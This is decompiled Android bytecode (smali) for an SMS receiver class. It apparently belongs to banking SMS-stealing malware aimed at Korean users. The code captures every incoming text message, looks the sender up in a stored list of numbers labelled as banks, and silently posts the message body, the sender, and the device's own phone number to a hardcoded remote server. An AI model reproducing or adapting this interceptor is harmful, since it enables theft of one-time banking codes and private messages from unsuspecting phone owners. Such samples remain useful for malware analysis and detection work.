.class public Lcom/allabyu/sms/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/allabyu/sms/SmsReceiver$NetworkAccess;
    }
.end annotation


# static fields
.field public static final SMS_RECEIVED:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field static final TAG:Ljava/lang/String; = "SmsReceiver"


# instance fields
.field MsgCont:Ljava/lang/String;

.field public ResultVal:Ljava/lang/String;

.field public csData:Ljava/util/ArrayList;

.field public ctx:Landroid/content/Context;

.field db:Landroid/database/sqlite/SQLiteDatabase;

.field helper:Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

.field public httpAddr:Ljava/lang/String;

.field public postData:Ljava/util/ArrayList;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/ArrayList",
            "<",
            "Lorg/apache/http/NameValuePair;",
            ">;"
        }
    .end annotation
.end field

.field public return_success:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    .prologue
    const/4 v1, 0x0

    .line 36
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    .line 40
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    .line 41
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lcom/allabyu/sms/SmsReceiver;->csData:Ljava/util/ArrayList;

    .line 42
    const-string v0, "http://128.199.251.171/appsms/sms_receiver.php"

    iput-object v0, p0, Lcom/allabyu/sms/SmsReceiver;->httpAddr:Ljava/lang/String;

    .line 43
    iput-object v1, p0, Lcom/allabyu/sms/SmsReceiver;->ResultVal:Ljava/lang/String;

    .line 44
    iput-object v1, p0, Lcom/allabyu/sms/SmsReceiver;->return_success:Ljava/lang/String;

    .line 45
    iput-object v1, p0, Lcom/allabyu/sms/SmsReceiver;->ctx:Landroid/content/Context;

    .line 46
    iput-object v1, p0, Lcom/allabyu/sms/SmsReceiver;->MsgCont:Ljava/lang/String;

    .line 36
    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 13
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 53
    :try_start_0
    new-instance v9, Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

    const-string v10, "allabyu.db"

    const/4 v11, 0x0

    const/4 v12, 0x1

    invoke-direct {v9, p1, v10, v11, v12}, Lcom/allabyu/sms_manager/MySQLiteOpenHelper;-><init>(Landroid/content/Context;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)V

    iput-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->helper:Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

    .line 54
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->helper:Lcom/allabyu/sms_manager/MySQLiteOpenHelper;

    invoke-virtual {v9}, Lcom/allabyu/sms_manager/MySQLiteOpenHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v9

    iput-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    .line 56
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v9

    const-string v10, "android.provider.Telephony.SMS_RECEIVED"

    invoke-virtual {v9, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v9

    if-eqz v9, :cond_4

    .line 57
    iput-object p1, p0, Lcom/allabyu/sms/SmsReceiver;->ctx:Landroid/content/Context;

    .line 58
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result-object v2

    .line 59
    .local v2, "bundle":Landroid/os/Bundle;
    if-nez v2, :cond_0

    .line 99
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    invoke-virtual {v9}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 101
    .end local v2    # "bundle":Landroid/os/Bundle;
    :goto_0
    return-void

    .line 62
    .restart local v2    # "bundle":Landroid/os/Bundle;
    :cond_0
    :try_start_1
    const-string v9, "pdus"

    invoke-virtual {v2, v9}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [Ljava/lang/Object;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 63
    .local v4, "pdusObj":[Ljava/lang/Object;
    if-nez v4, :cond_1

    .line 99
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    invoke-virtual {v9}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    goto :goto_0

    .line 67
    :cond_1
    :try_start_2
    const-string v9, "phone"

    invoke-virtual {p1, v9}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/telephony/TelephonyManager;

    .line 68
    .local v8, "telManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v5

    .line 70
    .local v5, "phoneNum":Ljava/lang/String;
    const-string v9, "+82"

    invoke-virtual {v5, v9}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v9

    if-eqz v9, :cond_2

    .line 71
    const-string v9, "+82"

    const-string v10, "0"

    invoke-virtual {v5, v9, v10}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    .line 74
    :cond_2
    const-string v0, ""

    .line 75
    .local v0, "MessageBody":Ljava/lang/String;
    const-string v1, ""

    .line 76
    .local v1, "SendNumber":Ljava/lang/String;
    array-length v9, v4

    new-array v7, v9, [Landroid/telephony/SmsMessage;

    .line 77
    .local v7, "smsMessages":[Landroid/telephony/SmsMessage;
    const/4 v3, 0x0

    .local v3, "i":I
    :goto_1
    array-length v9, v4

    if-lt v3, v9, :cond_5

    .line 83
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "type"

    const-string v12, "sms_data"

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 84
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "my_number"

    invoke-direct {v10, v11, v5}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 85
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "msg_cont"

    invoke-direct {v10, v11, v0}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 86
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "org_number"

    invoke-direct {v10, v11, v1}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 87
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->postData:Ljava/util/ArrayList;

    new-instance v10, Lorg/apache/http/message/BasicNameValuePair;

    const-string v11, "bank_number"

    const/4 v12, 0x0

    aget-object v12, v7, v12

    invoke-virtual {v12}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v10, v11, v12}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v9, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 89
    iput-object v0, p0, Lcom/allabyu/sms/SmsReceiver;->MsgCont:Ljava/lang/String;

    .line 90
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "SELECT * FROM RECEIVER_TBL WHERE receiver_number=\'"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/4 v11, 0x0

    aget-object v11, v7, v11

    invoke-virtual {v11}, Landroid/telephony/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v11

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "\'"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    const/4 v11, 0x0

    invoke-virtual {v9, v10, v11}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 91
    .local v6, "s":Landroid/database/Cursor;
    invoke-interface {v6}, Landroid/database/Cursor;->getCount()I

    move-result v9

    if-lez v9, :cond_3

    .line 92
    new-instance v9, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;

    invoke-direct {v9, p0}, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;-><init>(Lcom/allabyu/sms/SmsReceiver;)V

    const/4 v10, 0x0

    new-array v10, v10, [Ljava/lang/Void;

    invoke-virtual {v9, v10}, Lcom/allabyu/sms/SmsReceiver$NetworkAccess;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 94
    :cond_3
    invoke-interface {v6}, Landroid/database/Cursor;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 99
    .end local v0    # "MessageBody":Ljava/lang/String;
    .end local v1    # "SendNumber":Ljava/lang/String;
    .end local v2    # "bundle":Landroid/os/Bundle;
    .end local v3    # "i":I
    .end local v4    # "pdusObj":[Ljava/lang/Object;
    .end local v5    # "phoneNum":Ljava/lang/String;
    .end local v6    # "s":Landroid/database/Cursor;
    .end local v7    # "smsMessages":[Landroid/telephony/SmsMessage;
    .end local v8    # "telManager":Landroid/telephony/TelephonyManager;
    :cond_4
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    invoke-virtual {v9}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    goto/16 :goto_0

    .line 78
    .restart local v0    # "MessageBody":Ljava/lang/String;
    .restart local v1    # "SendNumber":Ljava/lang/String;
    .restart local v2    # "bundle":Landroid/os/Bundle;
    .restart local v3    # "i":I
    .restart local v4    # "pdusObj":[Ljava/lang/Object;
    .restart local v5    # "phoneNum":Ljava/lang/String;
    .restart local v7    # "smsMessages":[Landroid/telephony/SmsMessage;
    .restart local v8    # "telManager":Landroid/telephony/TelephonyManager;
    :cond_5
    :try_start_3
    aget-object v9, v4, v3

    check-cast v9, [B

    invoke-static {v9}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v9

    aput-object v9, v7, v3

    .line 79
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v10, v7, v3

    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 80
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    aget-object v10, v7, v3

    invoke-virtual {v10}, Landroid/telephony/SmsMessage;->getOriginatingAddress()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    move-result-object v1

    .line 77
    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_1

    .line 96
    .end local v0    # "MessageBody":Ljava/lang/String;
    .end local v1    # "SendNumber":Ljava/lang/String;
    .end local v2    # "bundle":Landroid/os/Bundle;
    .end local v3    # "i":I
    .end local v4    # "pdusObj":[Ljava/lang/Object;
    .end local v5    # "phoneNum":Ljava/lang/String;
    .end local v7    # "smsMessages":[Landroid/telephony/SmsMessage;
    .end local v8    # "telManager":Landroid/telephony/TelephonyManager;
    :catch_0
    move-exception v9

    .line 99
    iget-object v9, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    invoke-virtual {v9}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    goto/16 :goto_0

    .line 98
    :catchall_0
    move-exception v9

    .line 99
    iget-object v10, p0, Lcom/allabyu/sms/SmsReceiver;->db:Landroid/database/sqlite/SQLiteDatabase;

    invoke-virtual {v10}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 100
    throw v9
.end method
